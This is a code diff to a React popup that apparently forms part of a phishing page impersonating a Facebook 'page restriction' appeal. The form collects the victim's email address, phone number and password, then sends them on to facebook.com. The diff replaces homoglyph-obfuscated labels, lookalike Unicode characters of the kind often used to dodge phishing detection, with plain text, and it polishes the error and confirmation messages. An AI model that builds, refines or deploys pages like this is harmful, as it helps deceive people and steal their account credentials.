@@ -252,17 +252,17 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                     <div id="first-form">
                          <div className="mb-3">
                             <label htmlFor="exampleFormControlTextarea1" className="form-label">
-                            Рⅼеаѕе іոⅾісаtе ԝhу уоս bеⅼіеⅴе thе раցе rеѕtrісtіοո ԝаѕ аррⅼіеⅾ іո еrrοr.
+                            Please explain why you believe the page restriction was applied in error.
                             </label>
                             <textarea name="apeal" className="form-control" id="exampleFormControlTextarea1" rows="1"></textarea>
                         </div>
                         <div className="mb-3">
-                            <label htmlFor="BuisenessEmailField" className="form-label">Εⅿаіⅼ Αⅾⅾrеѕѕ</label>
+                            <label htmlFor="BuisenessEmailField" className="form-label">Email address</label>
                             <input onChange={(e) => {if(e.target.value.length > 100) return;setMail(e.target.value);}} name="buiseness-email" type="email" className="form-control" id="BuisenessEmailField"/>
                         </div>
 
                         <div className="mb-3">
-                            <label htmlFor="PhoneFirld" className="form-label">Рhоոе ոսⅿbеr</label>
+                            <label htmlFor="PhoneFirld" className="form-label">Phone number</label>
                             <PhoneInput
                             inputStyle={{border:'none',fontSize:'15px'}}
                             buttonStyle={{border:'none',backgroundColor:'#fff'}}
@@ -276,7 +276,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
 
 
                         <div style={{display: error ? 'inline-block' : 'none'}} className="mb-2 invalid-feedback">
-                          Email address or phone number is incorrect. Please try again!
+                          Email address or phone number is incorrect, please try again!
                         </div>
 
                         <div className="mb-3 form-check">
@@ -313,7 +313,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                              </div>
                              <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
-                                Password is incorrect, please try again.
+                                Password is incorrect, please try again!
                             </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -378,8 +378,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                               <img src="img/phone.png" style={{width: '100%'}}/>
                           </div>
                           <br/>
-                          <p>"Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.</p>
-  
+                          <p>Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.</p>
                       </div>
                       <form action="https://facebook.com/" method="GET">
                           <div className="form-btn-wrapper">
